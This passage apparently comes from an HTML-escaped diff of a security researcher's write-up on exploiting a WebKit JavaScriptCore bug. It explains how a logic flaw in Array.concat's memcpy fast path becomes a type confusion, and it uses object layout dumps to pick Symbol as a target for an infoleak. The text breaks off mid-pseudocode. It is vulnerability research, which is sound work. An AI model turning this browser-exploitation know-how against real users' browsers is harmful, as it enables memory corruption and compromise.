+&lt;p&gt;In this code snippet the &lt;code&gt;@&lt;/code&gt; is the interpreter glue which tells the JavaScript engine to look in the C++ bindings for the specified symbol. These functions are only callable via the JavaScript runtime which ships with Webkit, not user code. If you follow this through some indirection, you will find &lt;code&gt;@concatMemcpy&lt;/code&gt; corresponds to &lt;code&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/code&gt; in  &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L1309"&gt;&lt;code&gt;Source/JavaScriptCore/runtime/ArrayPrototype.cpp&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;EncodedJSValue&lt;/span&gt; &lt;span class="n"&gt;JSC_HOST_CALL&lt;/span&gt; &lt;span class="nf"&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ExecState&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;argumentCount&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="n"&gt;VM&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;vm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;resultArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsCast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;uncheckedArgument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;jsCast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;uncheckedArgument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;JSValue&lt;/span&gt; &lt;span class="n"&gt;startValue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;uncheckedArgument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isAnyInt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asAnyInt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asAnyInt&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;numeric_limits&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;::&lt;/span&gt;&lt;span class="n"&gt;max&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;static_cast&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;startValue&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asAnyInt&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;resultArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="c1"&gt;// [3] fastpath...&lt;/span&gt;
+    &lt;span class="c1"&gt;// … snip ...&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Which finally calls into &lt;code&gt;appendMemcpy&lt;/code&gt; in &lt;a href="https://github.com/WebKit/webkit/blob/e72e58665d57523f6792ad3479613935ecf9a5e0/Source/JavaScriptCore/runtime/JSArray.cpp#L474"&gt;&lt;code&gt;JSArray.cpp&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ExecState&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;VM&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JSC&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;JSArray&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="c1"&gt;// … snip ...&lt;/span&gt;
+
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;newLength&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;newLength&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="n"&gt;MIN_SPARSE_ARRAY_INDEX&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;ensureLength&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;newLength&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// [4] check dst size&lt;/span&gt;
+        &lt;span class="n"&gt;throwOutOfMemoryError&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;scope&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="n"&gt;ASSERT&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;copyType&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;indexingType&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;ArrayWithDouble&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguousDouble&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguousDouble&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JSValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;
+        &lt;span class="nf"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguous&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;startIndex&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;otherArray&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;butterfly&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;contiguous&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;JSValue&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;otherLength&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// [5] do the concat&lt;/span&gt;
+
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This may seem like a lot of code, but given &lt;code&gt;Array&lt;/code&gt;s &lt;code&gt;src&lt;/code&gt; and &lt;code&gt;dst&lt;/code&gt;, it boils down to this: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# JS Array.concat&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;concat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;Array&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;typeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;concatFastPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;concatSlowPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# C++ concatMemcpy / arrayProtoPrivateFuncAppendMemcpy&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;concatFastPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+&lt;span class="c1"&gt;# C++ appendMemcpy&lt;/span&gt;
+&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;allocated_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+        &lt;span class="n"&gt;resize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+
+    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;However, thanks to our bug we can skip the type validation at &lt;code&gt;[1]&lt;/code&gt; and call &lt;code&gt;arrayProtoPrivateFuncAppendMemcpy&lt;/code&gt; directly with non-&lt;code&gt;Array&lt;/code&gt; arguments! This turns the logic bug into a type confusion and opens up some exploitation possibilities.&lt;/p&gt;
+&lt;h3 id="jsobject-layouts"&gt;JSObject layouts&lt;/h3&gt;
+&lt;p&gt;To understand the bug a bit better, let’s look at the layout of &lt;code&gt;JSArray&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC JSArray
+Found 1 types matching &amp;quot;JSArray&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
+  +0 { 16} JSArray
+  +0 { 16}     JSC::JSNonFinalObject
+  +0 { 16}         JSC::JSObject
+  +0 {  8}             JSC::JSCell
+  +0 {  1}                 JSC::HeapCell
+  +0 &amp;lt;  4&amp;gt;                 JSC::StructureID m_structureID;
+  +4 &amp;lt;  1&amp;gt;                 JSC::IndexingType m_indexingTypeAndMisc;
+  +5 &amp;lt;  1&amp;gt;                 JSC::JSType m_type;
+  +6 &amp;lt;  1&amp;gt;                 JSC::TypeInfo::InlineTypeFlags m_flags;
+  +7 &amp;lt;  1&amp;gt;                 JSC::CellState m_cellState;
+  +8 &amp;lt;  8&amp;gt;             JSC::AuxiliaryBarrier&amp;lt;JSC::Butterfly *&amp;gt; m_butterfly;
+  +8 &amp;lt;  8&amp;gt;                 JSC::Butterfly * m_value;
+Total byte size: 16
+Total pad bytes: 0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;memcpy&lt;/code&gt; we’re triggering uses &lt;code&gt;butterfly()-&amp;gt;contiguous().data() + startIndex&lt;/code&gt; as a dst, and while this may initially look complicated, most of this compiles away. &lt;code&gt;butterfly()&lt;/code&gt; is a butterfly, as detailed in &lt;a href="http://phrack.org/papers/attacking_javascript_engines.html"&gt;saelo’s Phrack article&lt;/a&gt;. This means the &lt;code&gt;contiguous().data()&lt;/code&gt; portion effectively disappears. &lt;code&gt;startIndex&lt;/code&gt; is fully controlled  as well, so we can make this &lt;code&gt;0&lt;/code&gt;. As a result, our &lt;code&gt;memcpy&lt;/code&gt; reduces to: &lt;code&gt;memcpy(qword ptr [obj + 8], qword ptr [src + 8], sizeof(src))&lt;/code&gt;. To exploit this we simply need an object which has a non-butterfly pointer at offset &lt;code&gt;+8&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;This turns out to not be simple. Most objects I could find inherited from &lt;code&gt;JSObject&lt;/code&gt;, meaning they inherited the butterfly pointer field at &lt;code&gt;+8&lt;/code&gt;. In some cases (e.g. &lt;code&gt;ArrayBuffer&lt;/code&gt;) this value was simply &lt;code&gt;NULL&lt;/code&gt;’d, while in others I wound up type confusing a butterfly with another butterfly, to no effect. &lt;code&gt;JSString&lt;/code&gt;s were particularly frustrating, as the relevant portions of their layout were:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+8    flags  : u32
++12   length : u32
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The length field was controllable via user code, however flags were not. This gave me the primitive that I could control the top 32bit of a pointer, and while this might have been doable with some heap spray, I elected to Find a Better Bug(™).&lt;/p&gt;
+&lt;h3 id="salvation-through-symbols"&gt;Salvation Through Symbols&lt;/h3&gt;
+&lt;p&gt;My basic process at this point was to look at &lt;a href="https://developer.mozilla.org/en-US/docs/Glossary/Primitive"&gt;MDN&lt;/a&gt; for the types I could instantiate from the interpreter. Most of these were either boxed (&lt;code&gt;integer&lt;/code&gt;s, &lt;code&gt;bool&lt;/code&gt;s, etc), &lt;code&gt;Object&lt;/code&gt;s, or &lt;code&gt;String&lt;/code&gt;s. However, &lt;code&gt;Symbol&lt;/code&gt; was a JS primitive had a potentially useful layout:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout JSC Symbol
+Found 1 types matching &amp;quot;Symbol&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
+  +0 { 16} Symbol
+  +0 {  8}     JSC::JSCell
+  +0 {  1}         JSC::HeapCell
+  +0 &amp;lt;  4&amp;gt;         JSC::StructureID m_structureID;
+  +4 &amp;lt;  1&amp;gt;         JSC::IndexingType m_indexingTypeAndMisc;
+  +5 &amp;lt;  1&amp;gt;         JSC::JSType m_type;
+  +6 &amp;lt;  1&amp;gt;         JSC::TypeInfo::InlineTypeFlags m_flags;
+  +7 &amp;lt;  1&amp;gt;         JSC::CellState m_cellState;
+  +8 &amp;lt;  8&amp;gt;     JSC::PrivateName m_privateName;
+  +8 &amp;lt;  8&amp;gt;         WTF::Ref&amp;lt;WTF::SymbolImpl&amp;gt; m_uid;
+  +8 &amp;lt;  8&amp;gt;             WTF::SymbolImpl * m_ptr;
+Total byte size: 16
+Total pad bytes: 0
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;At &lt;code&gt;+8&lt;/code&gt; we have a pointer to a non-butterfly! Additionally, this object passes all the checks on the above code path, leading to a potentially controlled &lt;code&gt;memcpy&lt;/code&gt; on top of the &lt;code&gt;SymbolImpl&lt;/code&gt;. Now we just need a way to turn this into an infoleak...&lt;/p&gt;
+&lt;h3 id="diagrams"&gt;Diagrams&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;WTF::SymbolImpl&lt;/code&gt;’s layout:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x@webkit:~/WebKit/Tools/Scripts$ ./dump-class-layout WTF SymbolImpl
+Found 1 types matching &amp;quot;SymbolImpl&amp;quot; in &amp;quot;/home/x/WebKit/WebKitBuild/Release/lib/libJavaScriptCore.so&amp;quot;
+  +0 { 48} SymbolImpl
+  +0 { 24}     WTF::UniquedStringImpl
+  +0 { 24}         WTF::StringImpl
+  +0 &amp;lt;  4&amp;gt;             unsigned int m_refCount;
+  +4 &amp;lt;  4&amp;gt;             unsigned int m_length;
+  +8 &amp;lt;  8&amp;gt;             WTF::StringImpl::(anonymous union) None;
+ +16 &amp;lt;  4&amp;gt;             unsigned int m_hashAndFlags;
+ +20 &amp;lt;  4&amp;gt;             &amp;lt;PADDING&amp;gt;
+ +20 &amp;lt;  4&amp;gt;         &amp;lt;PADDING&amp;gt;
+ +20 &amp;lt;  4&amp;gt;     &amp;lt;PADDING&amp;gt;
+ +24 &amp;lt;  8&amp;gt;     WTF::StringImpl * m_owner;
+ +32 &amp;lt;  8&amp;gt;     WTF::SymbolRegistry * m_symbolRegistry;
+ +40 &amp;lt;  4&amp;gt;     unsigned int m_hashForSymbol;
+ +44 &amp;lt;  4&amp;gt;     unsigned int m_flags;
+Total byte size: 48
+Total pad bytes: 12
+Padding percentage: 25.00 %
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The codepath we’re on expects a butterfly with memory layout simplified to the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;       -8   -4     +0  +4  +8
++---------------------+---+-----------+
+|pub length|length| 0 | 1 | 2 |...| n |
++---------------------+---+-----------+
+                  ^
++-------------+   |
+|butterfly ptr+---+
++-------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;However, we’re providing it with something like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                    +0       +4     +8
++-----------------------------------------------+
+|       OOB        |refcount|length|str base ptr|
++-----------------------------------------------+
+                   ^
++--------------+   |
+|SymbolImpl ptr+---+
++--------------+
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;If we recall our earlier pseudocode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;appendMemcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;allocated_size&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
